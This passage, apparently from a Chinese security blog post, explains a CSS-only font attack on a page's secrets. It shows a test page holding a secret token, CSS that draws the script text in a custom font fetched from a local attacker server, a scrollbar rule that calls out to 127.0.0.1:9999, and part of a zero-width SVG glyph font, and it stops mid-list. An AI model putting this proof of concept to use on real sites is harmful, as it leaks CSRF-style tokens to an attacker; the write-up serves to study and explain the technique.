api 用来直接生成我们需要的 woff 文件，然后我们构造两个页面，第一个 test.html ，包含我们需要获取的 token2 ，有以下代码：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-keyword">var</span> token2 = <span class="hljs-string">"7b8a45b8297cf82cc3cefc174c3ae5a1"</span>;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-css">        <span class="hljs-keyword">@font-face</span> {</span></span><br><span class="line">            font-family: "hack";</span><br><span class="line">            src: url(http://172.16.71.138:3001/font/%22/7);</span><br><span class="line">        }</span><br><span class="line">        script {</span><br><span class="line">            display: table;</span><br><span class="line">            font-family: "hack";</span><br><span class="line">            white-space: nowrap;</span><br><span class="line">            background: lightblue;</span><br><span class="line">        }</span><br><span class="line"><span class="hljs-css">        <span class="hljs-selector-tag">body</span><span class="hljs-selector-pseudo">::-webkit-scrollbar</span> {</span></span><br><span class="line">            background: blue;</span><br><span class="line">        }</span><br><span class="line"><span class="hljs-css">        <span class="hljs-selector-tag">body</span><span class="hljs-selector-pseudo">::-webkit-scrollbar</span><span class="hljs-selector-pseudo">:horizontal</span> {</span></span><br><span class="line"><span class="hljs-css">            <span class="hljs-selector-tag">display</span><span class="hljs-selector-pseudo">:block</span>;</span></span><br><span class="line">            background: blue url(http://127.0.0.1:9999);</span><br><span class="line">        }</span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>我们这里用<code>display:table</code>将<code>script</code>标签内的内容输出出来，然后禁止换行，并使用我们构造的字体。那个 url 获取到的就是以下 svg 生成的 woff 文件：</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version='1.0'?&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">defs</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">font</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'hack'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span>&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">font-face</span> <span class="hljs-attr">font-family</span>=<span class="hljs-string">'hack'</span> <span class="hljs-attr">units-per-em</span>=<span class="hljs-string">'1000'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">' '</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'!'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'"'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'#'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'$'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'%'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'<span class="hljs-symbol">&amp;amp;</span>'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'<span class="hljs-symbol">&amp;apos;</span>'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'('</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">')'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'*'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'+'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">','</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'-'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'.'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'/'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'1'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'2'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'3'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'4'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'5'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'6'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'7'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'8'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'9'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">':'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">';'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'<span class="hljs-symbol">&amp;lt;</span>'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'='</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'&gt;'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'?'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'@'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'A'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'B'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'C'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'D'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'E'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'F'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'G'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'H'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'I'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'J'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'K'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'L'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'M'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'N'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'O'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'P'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'Q'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'R'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'S'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'T'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'U'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'V'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'W'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'X'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'Y'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'Z'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'['</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'\'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">']'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'^'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'_'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'`'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'a'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'b'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'c'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'d'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'e'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'f'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            